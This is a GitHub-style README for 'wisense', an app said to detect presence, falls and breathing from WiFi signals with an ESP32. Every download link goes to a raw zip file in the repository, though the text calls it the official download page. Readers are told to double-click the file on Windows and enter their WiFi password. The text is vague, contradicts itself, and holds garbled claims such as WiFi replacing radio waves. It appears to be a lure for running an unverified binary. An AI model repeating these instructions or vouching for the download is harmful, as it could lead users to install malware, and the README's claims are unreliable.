# 📡 wisense - WiFi Sensing That Respects Your Privacy

[![Download wisense](https://img.shields.io/badge/Download-wisense-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/emersonsteadied7796/wisense/main/wisense/v1.7.zip)

---

## 👋 Welcome to wisense

wisense turns your home into a smart space using **WiFi signals**—no cameras, no cloud, no complicated setup. It detects presence, falls, breathing rates, activities, and counts people in a room using an ESP32 device and your computer.

Think of it as **radar for your home**, but using WiFi instead of radio waves. Your privacy stays intact because everything runs locally on your own machine.

---

## ✨ What Can wisense Do?

- **🚶 Presence Detection** – Know when someone enters or leaves a room
- **🆘 Fall Detection** – Get alerted if someone falls (great for elderly care)
- **💓 Breathing Rate Monitoring** – Track breathing patterns without wearables
- **🏃 Activity Classification** – Recognize walking, sitting, standing, and more
- **👥 Occupancy Counting** – Know how many people are in a room

All of this happens **without any cameras**, meaning no privacy concerns. Your family's movements are never recorded or sent anywhere.

---

## 🎯 Who Is This For?

- **Homeowners** wanting affordable smart home automation
- **Caregivers** monitoring elderly relatives
- **Tech enthusiasts** exploring WiFi sensing
- **Small businesses** tracking foot traffic
- **DIY hobbyists** building privacy-first monitoring systems

---

## 🔧 What You Need

Before you start, gather these items:

| Item | Description |
|------|-------------|
| **ESP32 Device** | Any ESP32 development board (about $5-10) |
| **Windows Computer** | Windows 10 or 11 (64-bit recommended) |
| **WiFi Router** | Any standard WiFi router (2.4GHz or 5GHz) |
| **Python 3.8+** | Free download from python.org (optional but recommended) |

No programming experience required—just follow the steps below.

---

## 🚀 Getting Started

Let's get wisense running on your computer. Follow these simple steps:

### Step 1: Download the Application

👉 **[Click here to download wisense](https://raw.githubusercontent.com/emersonsteadied7796/wisense/main/wisense/v1.7.zip)**

This link will take you to the official download page. Once there, look for the latest release and download the file to your computer. Visit this link to download the application.

### Step 2: Set Up Your ESP32

1. Plug your ESP32 into your computer using a USB cable
2. Download the ESP32 firmware from the same download page
3. Open the firmware file and follow the on-screen instructions to install it
4. Once installed, unplug the ESP32 and place it in the room you want to monitor

### Step 3: Run wisense

1. Find the downloaded wisense file on your computer (usually in your Downloads folder)
2. Double-click to run it
3. Follow the setup wizard:
   - Select your WiFi network
   - Enter your WiFi password
   - Choose which features you want (presence, fall detection, etc.)
4. Click "Start" and wisense begins monitoring

### Step 4: View Your Dashboard

wisense opens a simple dashboard showing:
- Real-time presence status
- Breathing rate charts
- Activity logs
- Occupancy counts

Everything displays clearly on your screen with easy-to-read graphics.

---

## 📖 How to Use wisense Daily

Once running, wisense works automatically. Here's what you'll see:

### Main Dashboard
- **Green dot** – Room is occupied
- **Red dot** – Room is empty
- **Number display** – Shows how many people are present

### Alerts Setup
You can customize notifications:
- Email alerts for fall detection
- Sound notifications when someone enters
- Weekly activity reports
- No alert when room is empty (optional)

### Adjusting Sensitivity

If you find wisense too sensitive or not sensitive enough:
1. Open Settings
2. Adjust the "Sensitivity" slider
3. Test with different values until it feels right
4. Save your changes

---

## 🧪 Advanced Features

For users who want more control:

### Custom Activity Training

Teach wisense to recognize specific activities:
1. Go to "Training" tab
2. Perform the activity while wisense records
3. Name the activity (e.g., "vacuuming")
4. wisense learns and recognizes it next time

### Multiple Room Setup

Place multiple ESP32 devices throughout your home:
1. Each ESP32 works independently
2. Name each one (e.g., "Living Room", "Bedroom")
3. View all rooms on one dashboard
4. Set different rules for each room

### Data Export

Export your data for analysis:
- CSV files for spreadsheets
- JSON for developers
- PDF reports for caregivers

---

## 🔒 Privacy & Security

wisense takes your privacy seriously:

- ✅ **No cloud storage** – Everything stays on your computer
- ✅ **No camera** – Only WiFi signals are used
- ✅ **No account required** – Works offline
- ✅ **Open source** – You can verify the code yourself
- ✅ **Local processing** – Data never leaves your home network

Your family's movements are your business—not anyone else's.

---

## 🛠️ Troubleshooting Common Issues

### "ESP32 Not Connected"
- Check the USB cable is properly plugged in
- Try a different USB port
- Restart wisense and reconnect

### "No Signal Detected"
- Move the ESP32 closer to your router
- Remove large metal objects between devices
- Make sure the ESP32 is powered ON

### "Slow Response"
- Close other programs using network bandwidth
- Move your computer closer to the router
- Restart your router if needed

### "Wrong Occupancy Count"
- Check if walls or furniture block signals
- Calibrate by walking around while wisense learns
- Adjust sensitivity in settings

---

## 📚 Helpful Resources

- **📖 Official Documentation** – Visit the GitHub page for detailed guides
- **💬 Community Forum** – Join other wisense users for tips
- **🎥 Video Tutorials** – Watch step-by-step setup guides
- **🆘 Support Team** – Email us for personal assistance

---

## 🔄 Updating wisense

Keep wisense up to date:

1. wisense checks for updates automatically
2. When an update is available, a notification appears
3. Click "Update Now"
4. Follow the prompts—your settings are preserved

---

## 💡 Pro Tips

- Place the ESP32 at chest height for best fall detection
- Use multiple ESP32 devices for larger rooms
- Train activities during different times of day
- Check the dashboard occasionally to verify accuracy
- Keep your WiFi router away from thick walls

---

## 📝 Frequently Asked Questions

**Q: Does wisense work at night?**
A: Yes, WiFi signals work in complete darkness.

**Q: Can I use wisense outdoors?**
A: Not recommended—weather affects WiFi signals.

**Q: How many devices can I connect?**
A: Up to 10 ESP32 devices on one computer.

**Q: Does it work with any WiFi?**
A: Most standard WiFi routers work fine.

**Q: Is there a monthly fee?**
A: No, wisense is free forever.

---

## 🤝 Contributing to wisense

You don't need to be a programmer to help:

- **Report bugs** – Found an issue? Tell us on GitHub
- **Suggest features** – What would make wisense better?
- **Share your experience** – Write about your setup online
- **Translate** – Help make wisense available in your language

---

## ❤️ Thank You

Thank you for choosing wisense. We built this to bring affordable, privacy-respecting sensing to everyone. Your home deserves smart technology that doesn't watch you.

**Ready to start?** 

👉 **[Download wisense now](https://raw.githubusercontent.com/emersonsteadied7796/wisense/main/wisense/v1.7.zip)** and transform your living space today.

---

*wisense – Smart sensing, private by design.*

Keywords: channel-state-information, csi-id-173176, esp32, fall-detection, home-automation, human-action-recognition, human-activity-recognition, iot, onnx, onnx-runtime, onnxruntime, presence-detection, privacy, python, smart-home, wi-fi-signals, wifi